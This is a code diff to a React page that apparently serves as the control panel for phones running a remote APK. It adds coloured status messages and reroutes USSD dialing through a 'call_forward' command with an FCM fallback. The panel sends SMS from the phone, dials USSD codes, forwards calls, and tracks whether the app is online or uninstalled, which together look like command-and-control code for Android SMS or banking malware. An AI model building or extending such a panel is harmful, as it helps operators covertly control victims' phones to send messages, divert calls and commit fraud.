@@ -220,7 +220,7 @@ export default function DeviceDetailPage() {
   const [nets,       setNets]       = useState<any[]>([]);
 
   // Status log
-  const [statusLog,  setStatusLog]  = useState<{ ts: number; text: string } | null>(null);
+  const [statusLog,  setStatusLog]  = useState<{ ts: number; text: string; color?: "green" | "red" | "default" } | null>(null);
 
   // ── Action Alert ──────────────────────────────────────────────────────────
   // Each action type has its own WS handler → shows specific message
@@ -249,7 +249,9 @@ export default function DeviceDetailPage() {
     }
   }
 
-  function logStatus(text: string) { setStatusLog({ ts: Date.now(), text }); }
+  function logStatus(text: string, color?: "green" | "red" | "default") {
+    setStatusLog({ ts: Date.now(), text, color });
+  }
 
   // ── Loaders ───────────────────────────────────────────────────────────────
   async function loadAll() {
@@ -314,6 +316,7 @@ export default function DeviceDetailPage() {
 
         if (alertActionRef.current === "check_online") {
           showResult("Device is Online ✅");
+          logStatus("Device is Online", "green");
         }
         return;
       }
@@ -322,6 +325,7 @@ export default function DeviceDetailPage() {
       if (event === "device:uninstalled") {
         if (alertActionRef.current === "check_online") {
           showResult("App Uninstalled! ⚠️");
+          logStatus("App Uninstalled!", "red");
         }
         return;
       }
@@ -450,11 +454,15 @@ export default function DeviceDetailPage() {
       });
       if (!wsOk) await pushSendSms(did, sendNumber.trim(), sendMsg.trim(), sendSim);
       setSendOpen(false); setSendNumber(""); setSendMsg("");
-      logStatus("Send SMS command sent");
-      // Show immediate success — no WS ack for send SMS
+      logStatus("Send SMS command sent to device");
+      // NOTE: APK does not send back delivery confirmation yet
+      // Showing command-sent confirmation only (not delivery confirmation)
       alertActionRef.current = "send_sms";
       alertWindowRef.current = Date.now();
-      setDevAlert({ message: "✅ SMS command sent to device!", startTime: Date.now() });
+      setDevAlert({
+        message: "✅ SMS command sent to device.\n\nNote: Delivery confirmation requires device to be online and respond back.",
+        startTime: Date.now()
+      });
     } catch (e: any) {
       setDevAlert({ message: `❌ Failed: ${s(e?.message)}`, startTime: Date.now() });
     } finally { setSendLoading(false); }
@@ -505,14 +513,23 @@ export default function DeviceDetailPage() {
     const simLbl = ussdSim === 0 ? "SIM 1" : "SIM 2";
     setUssdOpen(false);
     logStatus(`Dialing USSD: ${ussdCode.trim()}`);
+    // NOTE: APK handles "call_forward" command for ANY USSD code — same as old panel
     openAlert("ussd",
       "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
     );
     try {
-      const wsOk = wsService.sendCmd("dial_ussd", {
-        uniqueid: did, ussdCode: ussdCode.trim(), sim: simLbl, timestamp: Date.now(),
+      // Use call_forward WS command — this is what APK understands for USSD
+      const wsOk = wsService.sendCmd("call_forward", {
+        uniqueid: did,
+        phoneNumber: "",       // empty for non-call-forward USSD
+        sim: simLbl,
+        callCode: ussdCode.trim(),   // the USSD code e.g. *123#
+        timestamp: Date.now(),
       });
-      if (!wsOk) await pushCallForward(did, ussdCode.trim(), simLbl, "");
+      if (!wsOk) {
+        // FCM fallback — same logic
+        await pushCallForward(did, ussdCode.trim(), simLbl, "");
+      }
     } catch (e: any) {
       showResult(`❌ USSD failed: ${s(e?.message)}`);
     } finally { setUssdLoading(false); setUssdCode(""); }
@@ -686,7 +703,12 @@ export default function DeviceDetailPage() {
               {statusLog && (
                 <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px] text-gray-700">
                   <TimeAgo ts={statusLog.ts} className="text-gray-500" />
-                  <span className="font-semibold">: {statusLog.text}</span>
+                  <span>: </span>
+                  <span className={
+                    statusLog.color === "green" ? "font-semibold text-green-600" :
+                    statusLog.color === "red"   ? "font-semibold text-red-600"   :
+                    "font-semibold text-gray-900"
+                  }>{statusLog.text}</span>
                 </div>
               )}
 
